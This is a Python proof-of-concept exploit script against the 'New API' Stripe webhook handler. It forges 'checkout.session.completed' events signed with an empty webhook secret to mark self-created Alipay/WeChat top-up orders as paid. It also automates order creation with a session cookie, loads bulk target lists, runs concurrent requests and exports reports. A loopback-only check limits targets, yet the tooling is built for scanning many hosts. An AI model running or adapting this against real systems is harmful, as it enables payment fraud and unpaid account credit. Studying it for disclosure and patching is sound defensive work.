#!/usr/bin/env python3
"""
Local-only PoC for the New API Stripe webhook forgery issue.
Enhanced with auto-order creation, bulk testing, concurrency, and report generation.
"""

from __future__ import annotations

import argparse
import csv
import concurrent.futures
import hashlib
import hmac
import json
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import List, Dict, Any, Tuple

LOOPBACK_HOSTS = {"127.0.0.1", "localhost", "::1"}

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Local-only PoC for forged Stripe webhook completion (Auto-Order & Bulk Edition)."
    )
    
    # Target Inputs
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument(
        "--base-url",
        help="Single local base URL, e.g., http://127.0.0.1:3000",
    )
    group.add_argument(
        "--file",
        help="Path to a text file containing base URLs (one per line)",
    )
    
    parser.add_argument(
        "--path",
        default="/api/stripe/webhook",
        help="Webhook path to append to base URLs (default: /api/stripe/webhook)",
    )
    
    # Authentication & Order Generation
    parser.add_argument(
        "--token",
        help="Session token for Cookie (session=<token>). Required if --trade-no is not provided.",
    )
    parser.add_argument(
        "--trade-no",
        help="Known pending order out_trade_no to place into client_reference_id. If omitted, the script will auto-create one.",
    )
    parser.add_argument(
        "--topup-amount",
        type=int,
        default=500,
        help="Amount to use for auto order creation if --trade-no is not provided (default: 500)",
    )

    # Concurrency and Export
    parser.add_argument(
        "--concurrency",
        type=int,
        default=1,
        help="Number of concurrent requests (default: 1)",
    )
    parser.add_argument(
        "--output-json",
        help="File path to export results as JSON",
    )
    parser.add_argument(
        "--output-csv",
        help="File path to export results as CSV",
    )

    # Payload Parameters (Stripe Webhook specific)
    parser.add_argument(
        "--customer", default="cus_poc_local", help="Fake Stripe customer id"
    )
    parser.add_argument(
        "--amount-total", type=int, default=100, help="Fake amount_total in minor units for Webhook"
    )
    parser.add_argument(
        "--currency", default="usd", help="Fake currency (default: usd)"
    )
    parser.add_argument(
        "--timestamp", type=int, default=int(time.time()), help="Unix timestamp for signature"
    )
    parser.add_argument(
        "--event-id", default="evt_poc_local", help="Fake Stripe event id"
    )
    parser.add_argument(
        "--session-id", default="cs_poc_local", help="Fake Stripe Checkout Session id"
    )
    parser.add_argument(
        "--api-version", default="2020-08-27", help="Stripe API version string"
    )

    # Network Parameters
    parser.add_argument(
        "--timeout", type=float, default=10.0, help="HTTP timeout in seconds"
    )
    parser.add_argument(
        "--insecure-tls", action="store_true", help="Disable TLS certificate verification"
    )
    return parser

def validate_loopback_url(raw_url: str) -> urllib.parse.ParseResult:
    parsed = urllib.parse.urlparse(raw_url)
    # return True
    if parsed.scheme not in {"http", "https"}:
        raise ValueError(f"Scheme must be http or https (got {parsed.scheme})")
    if not parsed.hostname:
        raise ValueError("URL must include a hostname")
    if parsed.hostname not in LOOPBACK_HOSTS:
        raise ValueError(
            f"Refusing non-loopback target ({parsed.hostname}); restricted to localhost/127.0.0.1/::1"
        )
    return parsed

def build_event(args: argparse.Namespace, trade_no: str) -> dict:
    return {
        "id": args.event_id,
        "object": "event",
        "api_version": args.api_version,
        "created": args.timestamp,
        "livemode": False,
        "pending_webhooks": 1,
        "type": "checkout.session.completed",
        "data": {
            "object": {
                "id": args.session_id,
                "object": "checkout.session",
                "client_reference_id": trade_no,
                "customer": args.customer,
                "status": "complete",
                "amount_total": args.amount_total,
                "currency": args.currency.lower(),
            }
        },
    }

def build_signature_header(payload_bytes: bytes, timestamp: int) -> str:
    signed_payload = f"{timestamp}.".encode("utf-8") + payload_bytes
    # Empty webhook secret simulation
    digest = hmac.new(b"", signed_payload, hashlib.sha256).hexdigest()
    return f"t={timestamp},v1={digest}"

def make_json_request(url: str, method: str = "GET", json_data: dict = None, token: str = None, timeout: float = 10.0, insecure_tls: bool = False) -> Tuple[dict, int]:
    headers = {}
    if token:
        headers["Cookie"] = f"session={token}"
    
    data_bytes = None
    if json_data is not None:
        data_bytes = json.dumps(json_data).encode("utf-8")
        headers["Content-Type"] = "application/json"
        
    req = urllib.request.Request(url, data=data_bytes, method=method, headers=headers)
    
    context = None
    if urllib.parse.urlparse(url).scheme == "https" and insecure_tls:
        context = ssl._create_unverified_context()
        
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=context) as response:
            body = response.read().decode("utf-8")
            return json.loads(body), response.status
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", errors="replace")
        try:
            return json.loads(body), exc.code
        except Exception:
            raise Exception(f"HTTP {exc.code} - Invalid JSON response: {body[:200]}")

def auto_create_order(base_url: str, token: str, amount: int, timeout: float, insecure_tls: bool) -> Tuple[str, List[str]]:
    logs = []
    
    # 1. Fetch Topup Info
    info_url = f"{base_url}/api/user/topup/info"
    logs.append("Fetching /api/user/topup/info...")
    resp, status = make_json_request(info_url, "GET", token=token, timeout=timeout, insecure_tls=insecure_tls)
    if status != 200 or not resp.get("success"):
        raise Exception(f"Failed to fetch topup info. Response: {resp}")
        
    data = resp.get("data", {})
    
    # Validation: Ensure Stripe is NOT enabled
    if data.get("enable_stripe_topup") is True:
        raise Exception("Vulnerability conditions not met: enable_stripe_topup is True.")
        
    # Validation: Find alipay or wxpay
    methods_list = data.get("pay_methods", [])
    available_methods = [pm.get("type") for pm in methods_list if isinstance(pm, dict)]
    
    chosen_method = None
    if "alipay" in available_methods:
        chosen_method = "alipay"
    elif "wxpay" in available_methods:
        chosen_method = "wxpay"
        
    if not chosen_method:
        raise Exception(f"Conditions not met: Neither alipay nor wxpay found. Available: {available_methods}")
        
    logs.append(f"Condition verified. Using payment method: {chosen_method}.")
    
    # 2. Create Payment Order
    pay_url = f"{base_url}/api/user/pay"
    payload = {"amount": amount, "payment_method": chosen_method}
    logs.append(f"Posting to /api/user/pay with {payload}...")
    
    resp, status = make_json_request(pay_url, "POST", json_data=payload, token=token, timeout=timeout, insecure_tls=insecure_tls)
    
    if status != 200 or resp.get("message") != "success":
        raise Exception(f"Order creation failed. Response: {resp}")
        
    trade_no = resp.get("data", {}).get("out_trade_no")
    if not trade_no:
        raise Exception("Could not find out_trade_no in response.")
        
    logs.append(f"Order successfully created. trade_no: {trade_no}")
    return trade_no, logs

def send_webhook(target_url: str, payload_bytes: bytes, stripe_signature: str, timeout: float, insecure_tls: bool) -> Tuple[int, str]:
    request = urllib.request.Request(
        url=target_url,
        data=payload_bytes,
        method="POST",
        headers={
            "Content-Type": "application/json",
            "Stripe-Signature": stripe_signature,
            "User-Agent": "StripeWebhookBot",
        },
    )

    context = None
    if urllib.parse.urlparse(target_url).scheme == "https" and insecure_tls:
        context = ssl._create_unverified_context()

    try:
        with urllib.request.urlopen(request, timeout=timeout, context=context) as response:
            body = response.read().decode("utf-8", errors="replace")
            return response.status, body
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", errors="replace")
        return exc.code, body

def process_target(base_url: str, args: argparse.Namespace) -> Dict[str, Any]:
    """Worker function for threading"""
    base_url = base_url.strip().rstrip("/")
    target_webhook_url = f"{base_url}{args.path}"
    
    result = {
        "base_url": base_url,
        "webhook_url": target_webhook_url,
        "trade_no": args.trade_no,
        "status": "",
        "http_code": None,
        "details": ""
    }
    logs = []

    try:
        validate_loopback_url(target_webhook_url)
    except ValueError as exc:
        result["status"] = "skipped"
        result["details"] = str(exc)
        return result

    trade_no = args.trade_no

    try:
        # Step 1: Auto-create order if needed
        if not trade_no:
            trade_no, order_logs = auto_create_order(
                base_url, args.token, args.topup_amount, args.timeout, args.insecure_tls
            )
            logs.extend(order_logs)
            result["trade_no"] = trade_no
            
        # Step 2: Build Payload
        event = build_event(args, trade_no)
        payload_text = json.dumps(event, separators=(",", ":"), ensure_ascii=False)
        payload_bytes = payload_text.encode("utf-8")
        stripe_signature = build_signature_header(payload_bytes, args.timestamp)
        
        # Step 3: Send Webhook (does NOT use cookie)
        logs.append("Sending forged webhook...")
        status_code, body = send_webhook(
            target_webhook_url, payload_bytes, stripe_signature, args.timeout, args.insecure_tls
        )
        
        result["http_code"] = status_code
        if 200 <= status_code < 300:
            result["status"] = "accepted"
        else:
            result["status"] = "rejected"
            
        logs.append(f"Webhook response (HTTP {status_code}): {body.strip()[:200]}")
        result["details"] = " | ".join(logs)
        
    except Exception as exc:
        result["status"] = "error"
        logs.append(f"Error: {str(exc)}")
        result["details"] = " | ".join(logs)

    return result

def export_json(results: List[Dict], filepath: str):
    with open(filepath, 'w', encoding='utf-8') as f:
        json.dump(results, f, indent=4, ensure_ascii=False)
    print(f"[*] Results exported to JSON: {filepath}")

def export_csv(results: List[Dict], filepath: str):
    if not results:
        return
    with open(filepath, 'w', encoding='utf-8', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=results[0].keys())
        writer.writeheader()
        writer.writerows(results)
    print(f"[*] Results exported to CSV: {filepath}")

def main() -> int:
    parser = build_parser()
    args = parser.parse_args()

    # Pre-Flight Validation
    if not args.trade_no and not args.token:
        parser.error("--token is required if --trade-no is not provided to automatically create an order.")

    # Load URLs
    urls = []
    if args.base_url:
        urls.append(args.base_url)
    if args.file:
        try:
            with open(args.file, 'r', encoding='utf-8') as f:
                urls.extend([line.strip() for line in f if line.strip()])
        except Exception as e:
            print(f"[-] Failed to read file {args.file}: {e}", file=sys.stderr)
            return 1
            
    # Deduplicate URLs
    urls = list(set(urls))
    print(f"[*] Loaded {len(urls)} unique base URLs.")

    # Execute Concurrently
    results = []
    print(f"[*] Starting tasks with concurrency: {args.concurrency}")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.concurrency) as executor:
        futures = [
            executor.submit(process_target, url, args)
            for url in urls
        ]
        
        for future in concurrent.futures.as_completed(futures):
            res = future.result()
            results.append(res)
            
            # Print status to console
            status = res['status'].upper()
            code = f" (HTTP {res['http_code']})" if res['http_code'] else ""
            t_no = f" [TradeNo: {res['trade_no']}]" if res.get('trade_no') else ""
            
            print(f"[{status}] {res['base_url']}{code}{t_no}")
            
            # 打印被拒绝/报错的详情（如果没有请求生成文件则全量打印辅助调试）
            if status in ("REJECTED", "ERROR", "SKIPPED") or (not args.output_json and not args.output_csv):
                print(f"    -> {res['details']}")

    # Export Reports
    if args.output_json:
        export_json(results, args.output_json)
    if args.output_csv:
        export_csv(results, args.output_csv)

    return 0

if __name__ == "__main__":
    raise SystemExit(main())
